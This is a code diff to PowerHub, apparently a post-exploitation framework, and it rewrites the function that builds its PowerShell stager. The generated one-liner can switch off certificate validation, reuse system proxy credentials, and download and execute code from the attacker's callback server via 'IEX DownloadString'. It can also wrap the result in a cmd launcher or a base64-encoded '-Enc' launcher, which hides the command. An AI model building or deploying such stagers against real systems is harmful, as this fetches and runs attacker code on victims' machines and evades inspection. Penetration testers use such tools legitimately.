@@ -1,6 +1,7 @@
 from powerhub.args import args
 from powerhub.directories import BASE_DIR, MOD_DIR
 import os
+import binascii
 
 
 def import_module_type(mod_type, filter=lambda x: True):
@@ -98,32 +99,44 @@ webdav_url = 'http://%s:%d/webdav' % (
     args.LPORT,
 )
 
-ssl_tls12 = (
-    "[Net.ServicePointManager]::SecurityProtocol="
-    "[Net.SecurityProtocolType]::Tls12;"
-)
-
 endpoints = {
     'hub': "0",
     'reverse_shell': "0?r",
 }
 
 
-def stager_str(flavor='hub',
-               need_proxy=True,
-               need_tlsv12=(args.SSL_KEY is not None)):
+def stager_str(get_args):
     result = ""
-    if args.SSL_KEY:
-        result += ("[System.Net.ServicePointManager]::ServerCertificate"
-                   "ValidationCallback={$true};")
-        if need_tlsv12:
+    from powerhub.tools import FINGERPRINT
+    if get_args['GroupTransport'] == 'https':
+        if get_args['RadioNoVerification'] == 'true':
+            result += ("[System.Net.ServicePointManager]::ServerCertificate"
+                       "ValidationCallback={$true};")
+        elif get_args['RadioFingerprint'] == 'true':
+            result += ("[System.Net.ServicePointManager]::ServerCertificate"
+                       "ValidationCallback={param($1,$2);"
+                       "$2.Thumbprint -eq \"%s\"};" %
+                       FINGERPRINT.replace(':', ''))
+        elif get_args['RadioCertStore'] == 'true':
+            pass
+        if get_args['CheckboxTLS1.2'] == 'true':
             result += ("[Net.ServicePointManager]::SecurityProtocol="
                        "[Net.SecurityProtocolType]::Tls12;")
-    result += "$K=new-object net.webclient;"
-    if need_proxy:
-        result += ("$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
-                   "$K.Proxy.Credentials=[Net.CredentialCache]::"
-                   "DefaultCredentials;")
 
-    result += "IEX $K.downloadstring('%s%s');"
-    return result % (callback_url, endpoints[flavor])
+    if get_args['GroupTransport'].startswith('http'):
+        result += "$K=New-Object Net.WebClient;"
+        if get_args['CheckboxProxy'] == 'true':
+            result += ("$K.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
+                       "$K.Proxy.Credentials=[Net.CredentialCache]::"
+                       "DefaultCredentials;")
+        result += "IEX $K.DownloadString(\"%s%s\");"
+        result = result % (callback_url, '0')
+
+    if get_args['GroupLauncher'] == 'cmd':
+        result = result.replace('"', '\\"')
+        result = 'powershell.exe "%s"' % result
+    elif get_args['GroupLauncher'] == 'cmd_enc':
+        result = 'powershell.exe -Enc %s' % \
+            binascii.b2a_base64(result.encode('utf-16le')).decode()
+
+    return result
